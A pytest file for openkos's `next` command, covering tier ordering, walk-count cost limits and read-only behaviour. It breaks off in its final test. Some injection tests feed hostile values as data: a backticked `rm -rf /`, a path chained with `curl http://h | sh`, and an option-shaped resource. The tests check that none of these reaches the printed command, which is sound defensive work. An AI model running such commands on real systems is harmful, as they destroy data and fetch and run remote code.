@@ -1,0 +1,994 @@
+"""Unit tests for the `next` CLI command and its tier engine
+(`openkos.cli.next_action`): a read-only, deterministic pointer to the one
+runnable command worth running next over the current bundle.
+
+Follows `test_status.py`'s pattern exactly: `_init_workspace` and
+`_snapshot`/`_snapshot_entry` are copied verbatim (`test_status.py:26-40`),
+and every cost-contract assertion patches a PUBLIC module attribute via
+`monkeypatch.setattr` -- never a private internal, never an rglob counter
+(design's Testing Strategy).
+"""
+
+from pathlib import Path
+
+import pytest
+from typer.testing import CliRunner
+
+from openkos import lint as lint_check
+from openkos.cli import next_action
+from openkos.cli.main import app
+from openkos.llm.base import EMBED_DIM
+from openkos.resolution import CandidateGroup
+from openkos.resolution import find_exact_title_groups as _real_find_exact_title_groups
+
+runner = CliRunner()
+
+
+def _snapshot_entry(path: Path) -> bytes | None:
+    if path.is_dir():
+        return None
+    return path.read_bytes()
+
+
+def _snapshot(root: Path) -> dict[Path, bytes | None]:
+    """Capture every entry under `root`, keyed by relative path."""
+    return {path.relative_to(root): _snapshot_entry(path) for path in root.rglob("*")}
+
+
+def _init_workspace(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.chdir(tmp_path)
+    result = runner.invoke(app, ["init"])
+    assert result.exit_code == 0
+
+
+class _OfflineOllama:
+    """Serves both halves of `OllamaClient` without a network, mirroring
+    `test_status.py`'s helper of the same name."""
+
+    def chat(self, messages: object) -> str:
+        return '{"extract": false}'
+
+    def embed(self, texts: "list[str]") -> "list[list[float]]":
+        return [[1.0] + [0.0] * (EMBED_DIM - 1) for _ in texts]
+
+
+class _RaisingOllamaClient:
+    """A sentinel that raises if constructed at all -- proves no model
+    backend is ever built on the `next` path (spec: No Model Backend
+    Constructed)."""
+
+    def __init__(self, *args: object, **kwargs: object) -> None:
+        raise AssertionError("OllamaClient must never be constructed by `next`")
+
+
+def _write_doc(path: Path, *, doc_type: str = "Concept", title: str = "Stub") -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(
+        f"---\ntype: {doc_type}\ntitle: {title}\n---\n# {title}\n",
+        encoding="utf-8",
+    )
+
+
+def _write_below_source_sensitivity_bundle(tmp_path: Path) -> None:
+    """Present vector index, one Source (confidential), one descendant
+    (public) below it -- reused from `test_status.py`'s below-source-
+    sensitivity fixture (design: same closure algorithm)."""
+    sources_dir = tmp_path / "bundle" / "sources"
+    sources_dir.mkdir(parents=True, exist_ok=True)
+    (sources_dir / "a.md").write_text(
+        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
+        "sensitivity: confidential\n---\nBody.\n",
+        encoding="utf-8",
+    )
+    concepts_dir = tmp_path / "bundle" / "concepts"
+    concepts_dir.mkdir(parents=True, exist_ok=True)
+    (concepts_dir / "derived.md").write_text(
+        "---\ntype: Concept\ntitle: Derived\nsensitivity: public\n"
+        "provenance:\n  - sources/a\n---\nBody.\n",
+        encoding="utf-8",
+    )
+
+
+def _write_multi_source_uncovered_only_bundle(tmp_path: Path) -> None:
+    """A bundle carrying a `multi-source-uncovered` finding but NO
+    `below-source-sensitivity` finding (trap 1's fixture, reused verbatim
+    from `test_status.py`)."""
+    sources_dir = tmp_path / "bundle" / "sources"
+    sources_dir.mkdir(parents=True, exist_ok=True)
+    (sources_dir / "a.md").write_text(
+        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
+        "sensitivity: public\n---\nBody.\n",
+        encoding="utf-8",
+    )
+    (sources_dir / "c.md").write_text(
+        "---\ntype: Source\ntitle: C\nresource: raw/c.txt\n"
+        "sensitivity: confidential\n---\nBody.\n",
+        encoding="utf-8",
+    )
+    concepts_dir = tmp_path / "bundle" / "concepts"
+    concepts_dir.mkdir(parents=True, exist_ok=True)
+    (concepts_dir / "from-c.md").write_text(
+        "---\ntype: Concept\ntitle: From C\nsensitivity: confidential\n"
+        "provenance:\n  - sources/c\n---\nBody.\n",
+        encoding="utf-8",
+    )
+    (concepts_dir / "mixed.md").write_text(
+        "---\ntype: Concept\ntitle: Mixed\nsensitivity: public\n"
+        "provenance:\n  - sources/a\n  - concepts/from-c\n---\nBody.\n",
+        encoding="utf-8",
+    )
+
+
+def _write_unextracted_source(
+    tmp_path: Path, *, name: str = "notes", resource: str = "raw/notes.txt"
+) -> None:
+    sources_dir = tmp_path / "bundle" / "sources"
+    sources_dir.mkdir(parents=True, exist_ok=True)
+    resource_line = f"resource: {resource}\n" if resource else ""
+    (sources_dir / f"{name}.md").write_text(
+        f"---\ntype: Source\ntitle: {name.title()}\n{resource_line}"
+        "extraction_status: failed\n---\nBody.\n",
+        encoding="utf-8",
+    )
+
+
+def _seed_vector_index(tmp_path: Path) -> None:
+    """Populate `.openkos/vectors.db` so `vector_store_empty` is False,
+    letting evaluation proceed past tier 1."""
+    openkos_dir = tmp_path / ".openkos"
+    openkos_dir.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(openkos_dir / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+
+
+# --- Phase 1: cost-contract foundation (`_BundleSignals`) -----------------
+
+
+def test_tier1_only_path_triggers_zero_bundle_walks(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Stopping at tier 1 (missing vector index) performs zero bundle
+    walks: neither `collect_docs` nor `find_exact_title_groups` is ever
+    called (spec: First-Hit Short-Circuit Cost Contract, "Stopping at tier
+    1 performs zero bundle walks")."""
+    _init_workspace(tmp_path, monkeypatch)
+    docs_calls = {"n": 0}
+    groups_calls = {"n": 0}
+    real_collect_docs = lint_check.collect_docs
+
+    def _counting_collect_docs(
+        bundle_dir: Path,
+    ) -> tuple[list[lint_check.LintDoc], list[str]]:
+        docs_calls["n"] += 1
+        return real_collect_docs(bundle_dir)
+
+    def _counting_find_exact_title_groups(bundle_dir: Path) -> list[CandidateGroup]:
+        groups_calls["n"] += 1
+        return []
+
+    monkeypatch.setattr(
+        "openkos.cli.next_action.lint_check.collect_docs", _counting_collect_docs
+    )
+    monkeypatch.setattr(
+        "openkos.cli.next_action.find_exact_title_groups",
+        _counting_find_exact_title_groups,
+    )
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos reindex" in result.stdout
+    assert docs_calls["n"] == 0
+    assert groups_calls["n"] == 0
+
+
+def test_docs_property_calls_collect_docs_exactly_once_when_read_twice(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """`_BundleSignals.docs`, read twice within one run (tiers 2 and 3),
+    still calls `collect_docs` exactly once -- the memo makes "one
+    `collect_docs()` call" true by construction (design: "lazy memoized
+    signals")."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    calls = {"n": 0}
+    real_collect_docs = lint_check.collect_docs
+
+    def _counting_collect_docs(
+        bundle_dir: Path,
+    ) -> tuple[list[lint_check.LintDoc], list[str]]:
+        calls["n"] += 1
+        return real_collect_docs(bundle_dir)
+
+    monkeypatch.setattr(lint_check, "collect_docs", _counting_collect_docs)
+    from openkos import config
+
+    layout = config.WorkspaceLayout(tmp_path)
+    signals = next_action._BundleSignals(layout)
+
+    _ = signals.docs
+    _ = signals.docs
+
+    assert calls["n"] == 1
+
+
+def _spy_walks(
+    monkeypatch: pytest.MonkeyPatch, *, real_groups: bool = False
+) -> tuple[dict[str, int], dict[str, int]]:
+    """Monkeypatch counting wrappers onto `collect_docs` and
+    `find_exact_title_groups`, returning their call-count dicts."""
+    docs_calls = {"n": 0}
+    groups_calls = {"n": 0}
+    real_collect_docs = lint_check.collect_docs
+
+    def _counting_collect_docs(
+        bundle_dir: Path,
+    ) -> tuple[list[lint_check.LintDoc], list[str]]:
+        docs_calls["n"] += 1
+        return real_collect_docs(bundle_dir)
+
+    def _counting_find_exact_title_groups(bundle_dir: Path) -> list[CandidateGroup]:
+        groups_calls["n"] += 1
+        return _real_find_exact_title_groups(bundle_dir) if real_groups else []
+
+    monkeypatch.setattr(
+        "openkos.cli.next_action.lint_check.collect_docs", _counting_collect_docs
+    )
+    monkeypatch.setattr(
+        "openkos.cli.next_action.find_exact_title_groups",
+        _counting_find_exact_title_groups,
+    )
+    return docs_calls, groups_calls
+
+
+def test_tier2_only_path_triggers_exactly_one_bundle_walk(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Stopping at tier 2 performs exactly one bundle walk (spec:
+    First-Hit Short-Circuit Cost Contract, "Stopping at tier 2...")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_unextracted_source(tmp_path)
+    docs_calls, groups_calls = _spy_walks(monkeypatch)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos ingest raw/notes.txt" in result.stdout
+    assert docs_calls["n"] == 1
+    assert groups_calls["n"] == 0
+
+
+def test_tier3_only_path_shares_tier2s_single_bundle_walk(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Stopping at tier 3 shares tier 2's single `collect_docs` call,
+    exercised through the real CLI path, not `_BundleSignals` directly
+    (spec: First-Hit Short-Circuit Cost Contract, "...sharing tier 2's
+    walk")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_below_source_sensitivity_bundle(tmp_path)
+    docs_calls, groups_calls = _spy_walks(monkeypatch)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos backfill-sensitivity" in result.stdout
+    assert docs_calls["n"] == 1
+    assert groups_calls["n"] == 0
+
+
+def test_tier4_path_performs_at_most_three_bundle_walks(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Reaching tier 4 performs at most three bundle walks in total:
+    `collect_docs` (1, shared by tiers 2/3) plus `find_exact_title_groups`
+    (2 internal walks), spied on together in one run (spec: First-Hit
+    Short-Circuit Cost Contract, "Reaching tier 4...")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    docs_calls, groups_calls = _spy_walks(monkeypatch, real_groups=True)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos duplicates" in result.stdout
+    assert docs_calls["n"] + (2 * groups_calls["n"]) <= 3
+
+
+# --- Phase 2: tier engine and order ----------------------------------------
+
+
+def _seed_all_four_tiers(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, *, vectors_present: bool
+) -> None:
+    if vectors_present:
+        openkos_dir = tmp_path / ".openkos"
+        openkos_dir.mkdir(parents=True, exist_ok=True)
+        import sqlite3
+
+        conn = sqlite3.connect(str(openkos_dir / "vectors.db"))
+        conn.execute(
+            "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+            "content_hash TEXT NOT NULL)"
+        )
+        conn.execute(
+            "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+        )
+        conn.commit()
+        conn.close()
+    _write_unextracted_source(tmp_path)
+    _write_below_source_sensitivity_bundle(tmp_path)
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+
+
+def test_all_four_tiers_present_tier_1_wins(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A bundle carrying all four tier findings at once recommends only
+    tier 1's command (spec: Pinned Tier Order, "All four tiers present,
+    tier 1 wins")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=False)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos reindex" in result.stdout
+    assert "openkos ingest" not in result.stdout
+    assert "openkos backfill-sensitivity" not in result.stdout
+    assert "openkos duplicates" not in result.stdout
+
+
+def test_tier_2_wins_once_tier_1_is_peeled_off(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """With the vector index present, tier 2 (unextracted source) wins over
+    tiers 3 and 4 (spec: "Tier 2 outranks tier 3")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos ingest raw/notes.txt" in result.stdout
+    assert "openkos backfill-sensitivity" not in result.stdout
+    assert "openkos duplicates" not in result.stdout
+
+
+def test_tier_3_wins_once_tiers_1_and_2_are_peeled_off(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """With the vector index present and no unextracted sources, tier 3
+    (below-source-sensitivity) wins over tier 4 (spec: "Tier 3 outranks
+    tier 4")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+    for path in (tmp_path / "bundle" / "sources").glob("*.md"):
+        if path.stem == "notes":
+            path.unlink()
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos backfill-sensitivity" in result.stdout
+    assert "openkos duplicates" not in result.stdout
+    assert "openkos ingest" not in result.stdout
+
+
+def test_tier_4_wins_once_tiers_1_2_3_are_all_peeled_off(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """With every higher tier empty, tier 4 (duplicate groups) wins (spec:
+    Duplicate-Group Check Gated on Higher Tiers, "runs only when tiers 1-3
+    are all empty")."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=True)
+    for path in (tmp_path / "bundle" / "sources").glob("*.md"):
+        if path.stem == "notes":
+            path.unlink()
+    (tmp_path / "bundle" / "concepts" / "derived.md").unlink()
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos duplicates" in result.stdout
+    assert "openkos reindex" not in result.stdout
+    assert "openkos ingest" not in result.stdout
+    assert "openkos backfill-sensitivity" not in result.stdout
+
+
+def test_tier_1_command_is_fixed_reindex(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Tier 1's printed command is exactly `openkos reindex` regardless of
+    finding detail (spec: Per-Tier Command, scenario 3)."""
+    _init_workspace(tmp_path, monkeypatch)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos reindex" in result.stdout
+
+
+def test_tier_4_command_is_fixed_duplicates(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Tier 4's printed command is exactly `openkos duplicates` regardless
+    of finding detail (spec: Per-Tier Command, scenario 4)."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos duplicates" in result.stdout
+
+
+def test_tier_2_command_matches_the_findings_own_retry_command(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Tier 2's printed command equals the unextracted-source finding's own
+    retry command (spec: Per-Tier Command, scenario 1)."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_unextracted_source(tmp_path, resource="raw/notes.txt")
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos ingest raw/notes.txt" in result.stdout
+
+
+def test_tier_3_command_equals_backfill_sensitivity(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Tier 3's printed command equals `openkos backfill-sensitivity` from
+    the finding's own detail (spec: Per-Tier Command, scenario 2)."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_below_source_sensitivity_bundle(tmp_path)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos backfill-sensitivity" in result.stdout
+
+
+# --- Trap 1: multi-source-uncovered's negating detail sentence ------------
+
+
+def test_trap1_multi_source_uncovered_never_surfaces_a_negated_command(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A bundle with only a `multi-source-uncovered` finding (no
+    `below-source-sensitivity` finding) never fires tier 3, and never
+    surfaces the negated `openkos backfill-sensitivity` command that
+    `multi-source-uncovered`'s own detail string contains
+    (`lint.py:766-768`)."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_multi_source_uncovered_only_bundle(tmp_path)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos backfill-sensitivity" not in result.stdout
+    assert "No ranked action found" in result.stdout
+
+
+# --- Trap 2: check_unextracted's empty-`resource` fallback ----------------
+
+
+def test_trap2_bare_ingest_fallback_never_fires_tier_2(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """When every unextracted finding is the `check_unextracted` empty-
+    `resource` fallback (`lint.py:632`), tier 2 declines rather than
+    printing the bare, non-runnable `openkos ingest`, and evaluation
+    continues to tier 3/4."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_unextracted_source(tmp_path, resource="")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos ingest" not in result.stdout
+    assert "Run: openkos duplicates" in result.stdout
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "x`rm -rf /`y",
+        # The dangerous shape is not an unrelated command but the tier's OWN
+        # verb carrying an appended option: `--auto` turns the recommended
+        # sweep from preview-and-confirm into an unattended bundle-wide write.
+        "x`openkos backfill-sensitivity --auto`y",
+        "`openkos backfill-sensitivity --help`",
+    ],
+)
+def test_document_controlled_sensitivity_cannot_dictate_the_printed_command(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, payload: str
+) -> None:
+    """A document's `sensitivity` frontmatter is stored verbatim and is
+    interpolated into the below-source-sensitivity detail BEFORE the command
+    it names. No value it carries -- not another command, and not the tier's
+    own verb with an option appended -- may become the line printed after
+    `Run:`. Tier 3's command takes no argument, so it is matched exactly."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    sources_dir = tmp_path / "bundle" / "sources"
+    sources_dir.mkdir(parents=True, exist_ok=True)
+    (sources_dir / "a.md").write_text(
+        "---\ntype: Source\ntitle: A\nresource: raw/a.txt\n"
+        "sensitivity: confidential\n---\nBody.\n",
+        encoding="utf-8",
+    )
+    concepts_dir = tmp_path / "bundle" / "concepts"
+    concepts_dir.mkdir(parents=True, exist_ok=True)
+    (concepts_dir / "derived.md").write_text(
+        f'---\ntype: Concept\ntitle: Derived\nsensitivity: "{payload}"\n'
+        "provenance:\n  - sources/a\n---\nBody.\n",
+        encoding="utf-8",
+    )
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    for line in result.stdout.splitlines():
+        if line.startswith("Run: "):
+            assert line == "Run: openkos backfill-sensitivity"
+
+
+def test_option_shaped_resource_never_becomes_a_printed_argument(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Tier 2's argument position is for a resource path. A `resource` that
+    reads as an option would change what the recommended command does, so it
+    is declined rather than printed."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_unextracted_source(tmp_path, resource="-rf")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "Run: openkos ingest" not in result.stdout
+    assert "Run: openkos duplicates" in result.stdout
+
+
+def test_shell_metacharacter_resource_never_becomes_the_printed_command(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A Source's `resource` is stored verbatim from the ingested path, so it
+    can carry spaces or shell metacharacters. Tier 2 prints a command only
+    when the argument is a plain path; otherwise it declines and evaluation
+    continues, because a command that is not runnable as printed is worse
+    than no recommendation at all."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_unextracted_source(tmp_path, resource="raw/notes.txt; curl http://h | sh")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "curl" not in result.stdout
+    assert "Run: openkos ingest" not in result.stdout
+    assert "Run: openkos duplicates" in result.stdout
+
+
+# --- Duplicate-group check gated on higher tiers ---------------------------
+
+
+def test_duplicate_group_check_does_not_run_when_tier_1_fires(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The exact-title-group check does not run when tier 1 already fired
+    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 1)."""
+    _init_workspace(tmp_path, monkeypatch)
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    calls = {"n": 0}
+
+    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
+        calls["n"] += 1
+        return []
+
+    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert calls["n"] == 0
+
+
+def test_duplicate_group_check_does_not_run_when_tier_2_fires(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The exact-title-group check does not run when tier 2 already fired
+    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 2)."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_unextracted_source(tmp_path)
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    calls = {"n": 0}
+
+    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
+        calls["n"] += 1
+        return []
+
+    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos ingest raw/notes.txt" in result.stdout
+    assert calls["n"] == 0
+
+
+def test_duplicate_group_check_does_not_run_when_tier_3_fires(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The exact-title-group check does not run when tier 3 already fired
+    (spec: Duplicate-Group Check Gated on Higher Tiers, scenario 3)."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_vector_index(tmp_path)
+    _write_below_source_sensitivity_bundle(tmp_path)
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    calls = {"n": 0}
+
+    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
+        calls["n"] += 1
+        return []
+
+    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert "openkos backfill-sensitivity" in result.stdout
+    assert calls["n"] == 0
+
+
+def test_duplicate_group_check_runs_only_when_tiers_1_to_3_are_empty(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The exact-title-group check runs, and `openkos duplicates` is
+    recommended, once tiers 1-3 are all empty (spec: Duplicate-Group Check
+    Gated on Higher Tiers, scenario 4)."""
+    _init_workspace(tmp_path, monkeypatch)
+    seed_vectors = tmp_path / ".openkos"
+    seed_vectors.mkdir(parents=True, exist_ok=True)
+    import sqlite3
+
+    conn = sqlite3.connect(str(seed_vectors / "vectors.db"))
+    conn.execute(
+        "CREATE TABLE vector_meta (concept_id TEXT PRIMARY KEY, "
+        "content_hash TEXT NOT NULL)"
+    )
+    conn.execute(
+        "INSERT INTO vector_meta (concept_id, content_hash) VALUES ('stub', 'hash')"
+    )
+    conn.commit()
+    conn.close()
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
+    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
+    calls = {"n": 0}
+
+    def _counting(bundle_dir: Path) -> list[CandidateGroup]:
+        calls["n"] += 1
+        return _real_find_exact_title_groups(bundle_dir)
+
+    monkeypatch.setattr("openkos.cli.next_action.find_exact_title_groups", _counting)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert calls["n"] == 1
+    assert "openkos duplicates" in result.stdout
+
+
+# --- Phase 3: CLI wiring, honesty output, no-backend guard -----------------
+
+
+def test_next_refuses_when_not_a_workspace(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A directory that is not an initialized workspace exits non-zero,
+    prints a clear error to stderr, and prints no raw traceback (spec:
+    Workspace Presence Check, "Run outside a workspace")."""
+    monkeypatch.chdir(tmp_path)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code != 0
+    assert isinstance(result.exception, SystemExit)
+    assert "Traceback" not in result.stderr
+
+
+def test_next_exits_zero_on_every_in_workspace_state(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Every in-workspace state -- including a freshly initialized, empty
+    bundle -- exits 0 (spec: Workspace Presence Check, "Every in-workspace
+    state exits 0")."""
+    _init_workspace(tmp_path, monkeypatch)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+
+
+def test_next_rejects_json_flag(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """No `--json` or other structured output mode is offered (spec:
+    Read-Only and Human-Readable Only)."""
+    _init_workspace(tmp_path, monkeypatch)
+
+    result = runner.invoke(app, ["next", "--json"])
+
+    assert result.exit_code != 0
+    assert isinstance(result.exception, SystemExit)
+
+
+def test_next_never_writes_to_the_workspace(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """No file under the workspace is created, modified, or deleted across
+    an empty, healthy, and all-tiers-firing run (spec: No mutation on any
+    run)."""
+    _init_workspace(tmp_path, monkeypatch)
+    _seed_all_four_tiers(tmp_path, monkeypatch, vectors_present=False)
+    before = _snapshot(tmp_path)
+
+    result = runner.invoke(app, ["next"])
+
+    assert result.exit_code == 0
+    assert _snapshot(tmp_path) == before
+
+
+def test_next_never_constructs_ollama_client(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """No model backend is constructed on any workspace state, including
+    the no-action path (spec: No Model Backend Constructed)."""
+    _init_workspace(tmp_path, monkeypatch)
